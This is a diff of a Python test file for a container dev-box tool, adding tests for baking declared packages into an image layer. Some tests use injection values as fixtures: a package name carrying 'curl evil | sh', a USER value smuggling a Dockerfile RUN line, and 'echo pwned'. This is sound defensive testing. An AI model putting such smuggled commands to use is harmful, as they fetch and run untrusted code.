@@ -65,6 +65,7 @@ def fake(tmp_path, monkeypatch):
         lambda: {"UV_LINK_MODE": "copy", "npm_config_store_dir": "~/.local/share/pnpm/store"},
     )
     monkeypatch.setattr(config, "box_sock_in_vm", lambda: "/run/docker.sock")
+    monkeypatch.setattr(config, "box_packages", lambda: [])  # the [box].packages tests opt in
     # Stack-less by default (no compose file present) — the packaged generic-box path, where
     # box up must create `{project}_default` itself. The compose-project case opts in per test.
     monkeypatch.setattr(config, "compose_files", lambda: [])
@@ -129,6 +130,12 @@ def fake(tmp_path, monkeypatch):
         "oci_runtime": "crun",  # what `inspect {{.OCIRuntime}}` reports after create
         "image_locales": [],  # what `locale -a` lists in the image (the create-time probe)
         "image_lc_all": "",  # the image's own LC_ALL, as the same probe reads it
+        # The [box].packages layer: the base image's ID + USER, the layer's own fingerprint
+        # label (None → no layer image), and the Dockerfile each build was handed.
+        "image_id": "sha256:base",
+        "image_user": "",
+        "layer_fingerprint": None,
+        "dockerfiles": [],
     }
 
     envs: list[dict | None] = []
@@ -151,6 +158,16 @@ def fake(tmp_path, monkeypatch):
                 baked["FY_PROXY_PORT"] = state["baked_proxy_port"]
             lines = "".join(f"{k}={v}\n" for k, v in baked.items())
             return _Proc(0, lines + "PATH=/usr/bin\n" if baked else "")
+        if cmd[1] == "build":
+            dockerfile = Path(cmd[cmd.index("-f") + 1])
+            if dockerfile.is_absolute() and dockerfile.is_file():  # read before the tmpdir goes
+                state["dockerfiles"].append(dockerfile.read_text())
+            return _Proc(0)
+        if cmd[1] == "image" and "{{.Id}}\t{{.Config.User}}" in cmd:
+            return _Proc(0, f"{state['image_id']}\t{state['image_user']}\n")
+        if cmd[1] == "image" and box._packages_tag("img:tag") in cmd:
+            value = state["layer_fingerprint"]
+            return _Proc(0 if value else 1, f"{value}\n" if value else "")
         if cmd[1] == "image" and box.BASE_BOX_TAG in cmd:
             value = state["base_image_fingerprint"]
             return _Proc(0 if value else 1, f"{value}\n" if value else "")
@@ -604,6 +621,232 @@ def test_up_builds_when_the_base_image_is_a_different_box(fake):
     assert box.main("up") == 0
     assert not _find(fake["calls"], has=["tag", box.BASE_BOX_TAG, "img:tag"])
     assert _find(fake["calls"], has=["build", "-t", "img:tag"])
+
+
+_LAYER = "img-packages:tag"
+
+
+def _with_packages(fake, monkeypatch, packages=("just", "nodejs")):
+    monkeypatch.setattr(config, "box_packages", lambda: sorted(packages))
+    fake["state"].update(img=True, image_fingerprint="expected-fingerprint")
+
+
+def _layer_fp(fake, packages=("just", "nodejs")):
+    return box._packages_fingerprint(
+        "expected-fingerprint", fake["state"]["image_id"], sorted(packages)
+    )
+
+
+def test_up_bakes_packages_into_a_layer_and_runs_it(fake, monkeypatch):
+    _with_packages(fake, monkeypatch)
+    assert box.main("up") == 0
+    assert not _find(fake["calls"], has=["build", "-t", "img:tag"])  # the base was current
+    (layer,) = _find(fake["calls"], has=["build", "-t", _LAYER])
+    assert f"{box._BOX_FINGERPRINT_LABEL}={_layer_fp(fake)}" in layer
+    (dockerfile,) = fake["state"]["dockerfiles"]
+    assert dockerfile.startswith("FROM img:tag\n")
+    assert "USER" not in dockerfile  # the image runs as root already: nothing to restore
+    (run,) = _find(fake["calls"], has=["run", "-d"])
+    assert run[run.index("sleep") - 1] == _LAYER  # the box runs the layer, not the bare base
+
+
+def test_up_reuses_a_current_packages_layer(fake, monkeypatch):
+    # The point of the layer: a recreated box installs nothing.
+    _with_packages(fake, monkeypatch)
+    fake["state"]["layer_fingerprint"] = _layer_fp(fake)
+    assert box.main("up") == 0
+    assert not [c for c in fake["calls"] if c[1] == "build"]
+    (run,) = _find(fake["calls"], has=["run", "-d"])
+    assert _LAYER in run
+
+
+@pytest.mark.parametrize(
+    "change",
+    [
+        {"image_id": "sha256:rebuilt"},  # `fy box build` rebuilt the base under it
+        {"packages": ("just", "nodejs", "unzip")},  # the list changed
+    ],
+)
+def test_up_rebuilds_a_stale_packages_layer(fake, monkeypatch, change):
+    fake["state"]["layer_fingerprint"] = _layer_fp(fake)  # built for just + nodejs on sha256:base
+    _with_packages(fake, monkeypatch, change.get("packages", ("just", "nodejs")))
+    if "image_id" in change:
+        fake["state"]["image_id"] = change["image_id"]
+    assert box.main("up") == 0
+    assert _find(fake["calls"], has=["build", "-t", _LAYER])
+
+
+def test_packages_fingerprint_ignores_order_but_not_content(monkeypatch):
+    for raw in (["nodejs", "just"], ["just", "nodejs", "just"]):
+        monkeypatch.setattr(config, "_box_table", lambda raw=raw: {"packages": raw})
+        assert config.box_packages() == ["just", "nodejs"]
+    assert box._packages_fingerprint("b", "i", ["just"]) != box._packages_fingerprint(
+        "b", "i", ["just", "nodejs"]
+    )
+    # An edited Dockerfile not yet rebuilt is drift too, though the base image is the same one.
+    assert box._packages_fingerprint("b", "i", ["just"]) != box._packages_fingerprint(
+        "b2", "i", ["just"]
+    )
+
+
+def test_packages_layer_restores_the_images_user(fake, monkeypatch):
+    _with_packages(fake, monkeypatch)
+    fake["state"]["image_user"] = "vscode"
+    assert box.main("up") == 0
+    lines = fake["state"]["dockerfiles"][0].splitlines()
+    assert lines[1] == "USER 0" and lines[-1] == "USER vscode"
+
+
+def test_packages_layer_refuses_a_user_it_cant_render(fake, monkeypatch, capsys):
+    # The USER comes back out of the image and into a Dockerfile line: only a plain name/uid.
+    _with_packages(fake, monkeypatch)
+    fake["state"]["image_user"] = "x\nRUN evil"
+    assert box.main("up") == 1
+    assert not _find(fake["calls"], has=["build", "-t", _LAYER])
+    assert not _find(fake["calls"], has=["run", "-d"])
+    assert "USER" in capsys.readouterr().err
+
+
+def test_packages_layer_refuses_a_base_it_cant_inspect(fake, monkeypatch, capsys):
+    # The layer's fingerprint carries the base's ID. Without one it would build FROM an image that
+    # may not exist and fail generically, or bake a fingerprint the next inspect calls stale.
+    _with_packages(fake, monkeypatch)
+    fake["state"]["image_id"] = ""
+    assert box.main("up") == 1
+    assert not _find(fake["calls"], has=["build", "-t", _LAYER])
+    assert not _find(fake["calls"], has=["run", "-d"])
+    assert "can't inspect the box image img:tag" in capsys.readouterr().err
+
+
+def test_a_failed_packages_build_starts_no_box(fake, monkeypatch):
+    _with_packages(fake, monkeypatch)
+    real = box.subprocess.run
+
+    def failing(cmd, **kw):
+        if cmd[1] == "build":
+            return _Proc(1)
+        return real(cmd, **kw)
+
+    monkeypatch.setattr(box.subprocess, "run", failing)
+    assert box.main("up") == 1
+    assert not _find(fake["calls"], has=["run", "-d"])
+
+
+def test_running_box_without_its_packages_layer_is_drift(fake, monkeypatch, capsys):
+    # Declaring packages on a running box: the box was made from the bare base, so recreate.
+    _with_packages(fake, monkeypatch)
+    fake["state"].update(running=True, exists=True)  # box_fingerprint = the base's
+    assert box.main("up") == 0
+    assert "fy box down && fy box up" in capsys.readouterr().out
+    fake["state"]["box_fingerprint"] = _layer_fp(fake)
+    assert box.main("up") == 0
+    assert "older image definition" not in capsys.readouterr().out
+
+
+def test_box_build_rebuilds_the_packages_layer(fake, monkeypatch, capsys):
+    _with_packages(fake, monkeypatch)
+    fake["state"]["layer_fingerprint"] = _layer_fp(fake)  # current, and built anyway
+    assert box.main("build") == 0
+    assert _find(fake["calls"], has=["build", "-t", "img:tag"])
+    assert _find(fake["calls"], has=["build", "-t", _LAYER])
+    assert f"✓ built {_LAYER}" in capsys.readouterr().out
+
+
+@pytest.mark.parametrize(
+    "raw", [["nodejs; curl evil | sh"], ["-y"], [""], "nodejs", [["nested"]], [3]]
+)
+def test_box_packages_refuses_what_isnt_a_package_name(monkeypatch, raw):
+    monkeypatch.setattr(config, "_box_table", lambda: {"packages": raw})
+    with pytest.raises(SystemExit, match=r"\[box\]\.packages"):
+        config.box_packages()
+
+
+def test_box_up_refuses_bad_packages_before_any_engine_call(fake, monkeypatch, capsys):
+    def bad():
+        raise SystemExit("✗ [box].packages: nope")
+
+    monkeypatch.setattr(config, "box_packages", bad)
+    assert box.main("up") == 1
+    assert fake["calls"] == []
+    assert "[box].packages" in capsys.readouterr().err
+
+
+@pytest.mark.parametrize(
+    ("tag", "layer"),
+    [
+        ("acme-devbox:latest", "acme-devbox-packages:latest"),
+        ("acme-devbox", "acme-devbox-packages"),
+        ("registry:5000/acme/box", "registry:5000/acme/box-packages"),
+        ("registry:5000/acme/box:v2", "registry:5000/acme/box-packages:v2"),
+    ],
+)
+def test_packages_tag(tag, layer):
+    assert box._packages_tag(tag) == layer
+
+
+def _install(tmp_path, stubs: str, *packages: str) -> subprocess.CompletedProcess:
+    """The layer's install script under bash with package managers stubbed as functions, on a
+    PATH with nothing on it — so the host's own managers can't be the ones found."""
+    return subprocess.run(
+        [
+            shutil.which("bash") or "bash",
+            "-c",
+            stubs + box._INSTALL_PACKAGES,
+            "fy-packages",
+            *packages,
+        ],
+        capture_output=True,
+        text=True,
+        env={"PATH": str(tmp_path)},
+    )
+
+
+@pytest.mark.spawns("bash")  # runs the REAL install script under bash, managers as functions
+def test_install_script_hands_packages_to_apt_as_arguments(tmp_path):
+    stubs = 'apt-get() { printf \'%s|\' apt-get "$@"; echo; }\nrm() { echo "rm $*"; }\n'
+    out = _install(tmp_path, stubs, "nodejs", "just; echo pwned")
+    assert out.returncode == 0, out.stderr
+    lines = out.stdout.splitlines()
+    assert lines[:2] == [
+        "apt-get|update|",
+        "apt-get|install|-y|--no-install-recommends|nodejs|just; echo pwned|",
+    ]
+    assert lines[2].startswith("rm -rf /var/lib/apt/lists/")  # the glob expands on THIS host
+    assert "pwned\n" not in out.stdout  # one argument, never run
+
+
+@pytest.mark.spawns("bash")
+def test_install_script_falls_through_to_the_manager_present(tmp_path):
+    out = _install(tmp_path, 'apk() { echo "apk $*"; }\n', "curl")
+    assert out.returncode == 0, out.stderr
+    assert out.stdout.splitlines() == ["apk add --no-cache curl"]
+
+
+@pytest.mark.spawns("bash")
+def test_install_script_fails_closed_without_a_known_manager(tmp_path):
+    out = _install(tmp_path, "", "curl")
+    assert out.returncode == 1
+    assert "no package manager" in out.stderr and "curl" in out.stderr
+
+
+@pytest.mark.spawns("bash")
+def test_install_script_stops_at_the_first_failure(tmp_path):
+    # `set -e`: a failed install must fail the build, not leave a layer without the package.
+    stubs = 'apt-get() { [ "$1" = update ] || return 100; }\nrm() { echo "rm $*"; }\n'
+    out = _install(tmp_path, stubs, "nope")
+    assert out.returncode == 100
+    assert "rm" not in out.stdout
+
+
+def test_packages_dockerfile_runs_in_exec_form():
+    # Exec form: the image's SHELL can't reinterpret the script, and packages stay "$@".
+    import json
+
+    dockerfile = box._packages_dockerfile("img:tag", "", ["just"])
+    run = next(ln for ln in dockerfile.splitlines() if ln.startswith("RUN "))
+    argv = json.loads(run[4:])
+    assert argv[:2] == ["/bin/sh", "-c"] and argv[2] == box._INSTALL_PACKAGES
+    assert argv[3:] == ["fy-packages", "just"]
 
 
 def test_packaged_fingerprint_is_what_a_boxless_project_expects(monkeypatch, tmp_path):
